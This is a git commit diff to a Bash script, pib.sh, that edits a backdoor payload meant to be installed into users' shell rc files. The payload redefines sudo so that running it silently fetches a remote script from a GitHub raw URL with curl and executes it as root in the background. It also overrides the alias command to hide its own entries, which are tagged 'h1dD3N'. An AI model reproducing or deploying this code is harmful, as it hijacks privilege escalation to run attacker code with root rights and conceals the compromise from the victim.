cef001201731457f986c6cc9f5dfad72e878442b
skyf0l <tom.rorato@epitech.eu>
2021-06-21 15:53:18 +0200

    Update pib.sh

--- pib.sh
+++ pib.sh
@@ -1,6 +1,8 @@
 #!/bin/bash
 
-SUDO_ALIAS='\n\\alias sudo=\"sudo -l > /dev/null && ((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown)|nohup sudo bash >& /dev/null&disown) && unset -f alias && unalias sudo && sudo \\`#h1dD3N\\`\"\nfunction nalias() { if [ \$# = 0 ]; then \\alias | /bin/grep -v \"h1dD3N\"; else \\alias \"\$1\"; fi } #h1dD3N\"\nalias alias=\"nalias \\`#h1dD3N\\`\"'
+SUDO_ALIAS= '\alias sudo="sudo -l > /dev/null && ((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown)|nohup sudo bash >& /dev/null&disown) && unset -f alias && unalias sudo && sudo \`#h1dD3N\`"
+function nalias() { if [ $# = 0 ]; then \alias | /bin/grep -v "h1dD3N"; else \alias "$1"; fi } #h1dD3N"
+alias alias="nalias \`#h1dD3N\`"'
 
 function install_in_rc() {
     if ! [ -f "$1" ]; then
